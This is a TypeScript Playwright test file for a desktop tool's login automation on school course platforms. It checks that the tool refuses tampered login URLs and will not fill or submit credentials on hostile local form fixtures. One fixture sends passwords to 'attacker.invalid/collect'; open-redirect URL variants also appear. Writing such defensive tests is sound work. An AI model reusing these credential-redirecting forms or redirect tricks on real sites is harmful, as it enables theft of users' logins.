import { expect, test } from 'bun:test';
import { chromium } from 'playwright-core';
import { createHash } from 'node:crypto';
import { lstat, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { isAbsolute, join, resolve } from 'node:path';
import {
  OCS_ICVE_LOGIN, OCS_ICVE_LOGIN_URL, OCS_SUPPORTED_LOGINS, OCS_UNSUPPORTED_LOGINS,
  assertOcsLoginTarget, isSupportedOcsLogin, ocsLoginResultSchema, runOcsLogin
} from '../desktop/bun/ocs-login-runner';
import { OCS_PHONE_AUTOMATION, OCS_PHONE_LOGIN_URL } from '../desktop/ocs/automation-policy';
import { submitIcveFormOnce } from '../desktop/ocs/login-submission-policy';

const integration = process.env['SWU_OCS_LOGIN_BOUNDARY_TEST'] === '1' ? test : test.skip;

test('OCS login target validation pins canonical upstream HTTPS URLs without network', () => {
  expect(() => assertOcsLoginTarget(OCS_PHONE_AUTOMATION, OCS_PHONE_LOGIN_URL)).not.toThrow();
  expect(() => assertOcsLoginTarget(OCS_ICVE_LOGIN, OCS_ICVE_LOGIN_URL)).not.toThrow();
  for (const name of OCS_SUPPORTED_LOGINS) {
    const canonical = name === OCS_PHONE_AUTOMATION ? OCS_PHONE_LOGIN_URL : OCS_ICVE_LOGIN_URL;
    const parsed = new URL(canonical);
    for (const target of [
      'about:blank', 'not a URL', canonical.replace('https:', 'http:'),
      canonical.replace(parsed.host, `${parsed.host}.invalid`),
      canonical.replace(parsed.host, `${parsed.host}:8443`),
      canonical.replace(parsed.host, `invalid@${parsed.host}`),
      `${canonical}#fragment`, `${canonical}&extra=1`,
      `${parsed.origin}${parsed.pathname}/`,
      `${parsed.origin}/sso/auth?redirect=https://example.invalid/`,
      `${parsed.origin}/login?redirect=https://example.invalid/`
    ]) expect(() => assertOcsLoginTarget(name, target)).toThrow(DOMException);
  }
});

test('OCS supported adapters are separate from catalog entries and cannot report verified identity', () => {
  expect(OCS_SUPPORTED_LOGINS).toEqual([OCS_PHONE_AUTOMATION, OCS_ICVE_LOGIN]);
  for (const name of OCS_SUPPORTED_LOGINS) expect(isSupportedOcsLogin(name)).toBe(true);
  for (const name of [...Object.keys(OCS_UNSUPPORTED_LOGINS), '通用-新建页面', 'unrecognized']) expect(isSupportedOcsLogin(name)).toBe(false);
  const pending = {
    name: OCS_ICVE_LOGIN, status: 'submitted-pending-user', submitAttempts: 1,
    reason: 'platform-result-unverified', message: 'Pending manual verification.',
    loginVerified: false, requiresManualVerification: true
  };
  expect(ocsLoginResultSchema.safeParse(pending).success).toBe(true);
  expect(ocsLoginResultSchema.safeParse({ ...pending, loginVerified: true }).success).toBe(false);
  expect(ocsLoginResultSchema.safeParse({ ...pending, status: 'verified-login' }).success).toBe(false);
  expect(ocsLoginResultSchema.safeParse({ ...pending, submitAttempts: 2 }).success).toBe(false);
  expect(ocsLoginResultSchema.safeParse({ ...pending, values: [] }).success).toBe(false);
});

integration('OCS real Chrome rejects unsafe login origins and checks native submit policy using local DOM only', async () => {
  const executable = process.env['SWU_OCS_BROWSER'];
  const evidence = process.env['SWU_OCS_LOGIN_EVIDENCE'];
  if (!executable || !isAbsolute(executable) || !(await lstat(executable)).isFile()) throw new TypeError('SWU_OCS_BROWSER must explicitly name the verified standalone Chrome executable.');
  if (!evidence || !isAbsolute(evidence) || !(await lstat(evidence)).isDirectory()) throw new TypeError('SWU_OCS_LOGIN_EVIDENCE must name an existing unique project work directory.');
  const temp = 'D:\\Bugging\\Temp';
  if (!(await lstat(temp)).isDirectory()) throw new TypeError('The authorized temporary directory does not exist.');
  const profile = await mkdtemp(join(temp, 'swu-ocs-login-boundary-'));
  const context = await chromium.launchPersistentContext(profile, {
    executablePath: executable, headless: true, viewport: { width: 1000, height: 700 },
    ignoreHTTPSErrors: false, serviceWorkers: 'block', timeout: 30000,
    args: ['--disable-background-networking', '--disable-component-update', '--disable-sync', '--no-first-run', '--no-default-browser-check']
  });
  const requests: { method: string; local: boolean }[] = [];
  let passed = false;
  let localRequests = 0;
  let blankRejections = 0;
  let unsupportedResults = 0;
  // This is a local DOM policy fixture with egress denial, not a forged platform response.
  await context.route('**/*', async route => {
    const target = new URL(route.request().url());
    if (target.hostname === '127.0.0.1') await route.continue();
    else await route.abort('blockedbyclient');
  });
  context.on('request', request => requests.push({ method: request.method(), local: new URL(request.url()).hostname === '127.0.0.1' }));
  const server = Bun.serve({
    hostname: '127.0.0.1', port: 0,
    fetch: () => { localRequests += 1; return new Response('Real local server: origin rejection boundary, not a platform login page.', { headers: { 'content-type': 'text/plain' } }); }
  });
  try {
    const page = context.pages()[0];
    if (!page) throw new Error('The real Chrome context has no initial page.');
    expect(page.url()).toBe('about:blank');
    for (const name of OCS_SUPPORTED_LOGINS) {
      await expect(runOcsLogin(page, { name, values: [] }, { confirmed: false })).rejects.toThrow('confirmed:true');
      await expect(runOcsLogin(page, { name, values: [] }, { confirmed: true })).rejects.toThrow(TypeError);
      await expect(runOcsLogin(page, { name, values: [{ key: name === OCS_PHONE_AUTOMATION ? 'phone' : 'username', value: ' ' }] }, { confirmed: true })).rejects.toThrow(TypeError);
      blankRejections += 3;
    }
    for (const name of Object.keys(OCS_UNSUPPORTED_LOGINS)) {
      const result = await runOcsLogin(page, { name, values: [] }, { confirmed: true });
      expect(result.status).toBe('unsupported');
      expect(result.submitAttempts).toBe(0);
      expect(result.loginVerified).toBe(false);
      unsupportedResults += 1;
    }
    await expect(runOcsLogin(page, { name: '通用-新建页面', values: [] }, { confirmed: true })).rejects.toThrow(RangeError);
    expect(page.url()).toBe('about:blank');
    expect(requests).toHaveLength(0);
    expect(localRequests).toBe(0);
    await page.goto(server.url.href, { waitUntil: 'domcontentloaded', timeout: 10000 });
    await page.setContent(`
      <iframe name="sink"></iframe>
      <form method="post" action="/submit" target="sink">
        <input placeholder="请输入账号" type="text">
        <input placeholder="请输入密码" type="password">
        <div class="agreement"><label class="el-checkbox"><input type="checkbox" checked></label></div>
        <button class="login" type="submit">Submit</button>
        <output id="submit-count">0</output>
        <script>document.querySelector('form').addEventListener('submit', () => { const counter = document.querySelector('#submit-count'); counter.value = String(Number(counter.value) + 1); });</script>
      </form>
    `);
    const localCanonical = page.url();
    const markerValues = [
      { key: 'username', value: 'local-marker-user' },
      { key: 'password', value: 'local-marker-password' }
    ];
    await expect(runOcsLogin(page, { name: OCS_ICVE_LOGIN, values: markerValues }, { confirmed: true }))
      .rejects.toMatchObject({ name: 'SecurityError' });
    expect(await page.locator('[placeholder="请输入账号"]').inputValue()).toBe('');
    expect(await page.locator('[placeholder="请输入密码"]').inputValue()).toBe('');
    expect(await page.locator('#submit-count').textContent()).toBe('0');
    expect(requests.filter(request => request.method === 'POST')).toHaveLength(0);

    await page.setContent(`
      <iframe name="sink"></iframe>
      <form method="post" action="/submit" target="sink">
        <input placeholder="请输入账号" type="text">
        <input placeholder="请输入密码" type="password">
        <div class="agreement"><label class="el-checkbox"><input type="checkbox" checked></label></div>
        <button class="login" type="submit" formaction="https://attacker.invalid/collect">Submit</button>
      </form>
    `);
    await expect(page.evaluate(submitIcveFormOnce, {
      suppliedUsername: 'local-marker-user', suppliedPassword: 'local-marker-password', canonical: localCanonical, name: OCS_ICVE_LOGIN
    })).rejects.toThrow('SecurityError');
    expect(await page.locator('[placeholder="请输入账号"]').inputValue()).toBe('');
    expect(await page.locator('[placeholder="请输入密码"]').inputValue()).toBe('');

    await page.setContent(`
      <form method="post" action="/submit">
        <input placeholder="请输入账号" type="text">
        <input placeholder="请输入密码" type="password">
        <div class="agreement"><label class="el-checkbox"><input type="checkbox" checked></label></div>
        <button class="login" type="submit" formmethod="get">Submit</button>
      </form>
    `);
    await expect(page.evaluate(submitIcveFormOnce, {
      suppliedUsername: 'local-marker-user', suppliedPassword: 'local-marker-password', canonical: localCanonical, name: OCS_ICVE_LOGIN
    })).rejects.toThrow('SecurityError');
    expect(await page.locator('[placeholder="请输入账号"]').inputValue()).toBe('');
    expect(await page.locator('[placeholder="请输入密码"]').inputValue()).toBe('');

    await page.setContent(`
      <form method="post" action="/submit">
        <input placeholder="请输入账号" type="text">
        <input placeholder="请输入密码" type="password">
        <div class="agreement"><label class="el-checkbox"><input type="checkbox" checked></label></div>
        <a class="login" href="/submit">Submit</a>
      </form>
    `);
    const anchorResult = await page.evaluate(submitIcveFormOnce, {
      suppliedUsername: 'local-marker-user', suppliedPassword: 'local-marker-password', canonical: localCanonical, name: OCS_ICVE_LOGIN
    });
    expect(anchorResult.status).toBe('awaiting-user');
    expect(anchorResult.submitAttempts).toBe(0);
    expect(await page.locator('[placeholder="请输入账号"]').inputValue()).toBe('');
    expect(await page.locator('[placeholder="请输入密码"]').inputValue()).toBe('');

    await page.setContent(`
      <form method="post" action="/submit" target="sink">
        <iframe name="sink"></iframe>
        <input placeholder="请输入账号" type="text">
        <input placeholder="请输入密码" type="password" oninput="document.querySelector('button.login').replaceWith(document.createElement('button'))">
        <div class="agreement"><label class="el-checkbox"><input type="checkbox" checked></label></div>
        <button class="login" type="submit">Submit</button>
      </form>
    `);
    await expect(page.evaluate(submitIcveFormOnce, {
      suppliedUsername: 'local-marker-user', suppliedPassword: 'local-marker-password', canonical: localCanonical, name: OCS_ICVE_LOGIN
    })).rejects.toThrow('SecurityError');
    expect(requests.filter(request => request.method === 'POST')).toHaveLength(0);

    expect(requests).toHaveLength(1);

    await page.setContent(`
      <iframe name="sink"></iframe>
      <form method="post" action="/submit" target="sink">
        <input placeholder="请输入账号" type="text">
        <input placeholder="请输入密码" type="password">
        <div class="agreement"><label class="el-checkbox"><input type="checkbox" checked></label></div>
        <button class="login" type="submit">Submit</button>
      </form>
    `);
    const postRequest = page.waitForRequest(request => request.method() === 'POST' && new URL(request.url()).pathname === '/submit', { timeout: 5000 });
    const localResult = await page.evaluate(submitIcveFormOnce, {
      suppliedUsername: 'local-marker-user', suppliedPassword: 'local-marker-password', canonical: localCanonical, name: OCS_ICVE_LOGIN
    });
    expect(localResult.status).toBe('submitted-pending-user');
    expect(localResult.submitAttempts).toBe(1);
    await postRequest;
    expect(requests.filter(request => request.method === 'POST' && request.local)).toHaveLength(1);
    expect(requests.filter(request => !request.local)).toHaveLength(0);
    expect(localRequests).toBeGreaterThan(0);
    await page.close();
    const closedUnsupported = await runOcsLogin(page, { name: '职教云-账号密码登录', values: [] }, { confirmed: true });
    expect(closedUnsupported.status).toBe('unsupported');
    expect(closedUnsupported.loginVerified).toBe(false);
    passed = true;
  } finally {
    try { await context.close(); }
    finally {
      await server.stop(true);
      await rm(profile, { recursive: true });
      const paths = [
        'desktop/bun/ocs-login-runner.ts', 'tests/ocs-automation-login-boundary.test.ts',
        'desktop/bun/ocs-automation.ts', 'desktop/ocs/automation-policy.ts', 'desktop/ocs/login-submission-policy.ts',
        'vendor/ocs/source/packages/app/src/scripts/automation/wk/icve.ts'
      ];
      const fingerprints = Object.fromEntries(await Promise.all(paths.map(async path => [path, createHash('sha256').update(await readFile(resolve(import.meta.dir, '..', path))).digest('hex')] as const)));
      await writeFile(join(evidence, 'chrome-boundary-result.json'), JSON.stringify({
        at: new Date().toISOString(), passed, realChrome: true, profile, fingerprints,
        blankRejections, unsupportedResults, localRequests, observedRequests: requests.length,
        nonlocalRequests: requests.filter(request => !request.local).length,
        nonReadRequests: requests.filter(request => request.method !== 'GET').length,
        egressBlocked: true, publicSchoolPagesVisited: false, officialAccountDataRead: false,
        nonSensitiveMarkerUsed: true, fakePlatformPagesUsed: false, crossOriginPasswordFilled: false,
        schoolLoginSubmitted: false, localFixtureSubmitAttempts: 1, loginVerified: false, courseExecutionTested: false,
        compiledDesktopTested: false, releaseStatus: 'TEST_ONLY_RELEASE_BLOCKED'
      }, null, 2), 'utf8');
    }
  }
}, 45000);
